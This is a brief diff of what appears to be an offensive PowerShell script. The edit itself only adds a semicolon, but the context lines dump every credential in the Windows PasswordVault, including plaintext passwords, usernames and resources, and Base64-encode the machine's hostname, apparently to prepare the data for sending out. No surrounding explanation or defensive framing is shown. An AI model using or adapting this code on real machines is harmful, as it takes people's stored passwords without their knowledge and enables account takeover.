@@ -1,7 +1,7 @@
 function Encode64{
 param($Text);if($null -eq $Text){return "IA=="}else{$Bytes=[System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);return $EncodedText}
 };
-[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];
 $vault = New-Object Windows.Security.Credentials.PasswordVault;$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password | out-string;
 
 $hostname=Encode64(hostname);
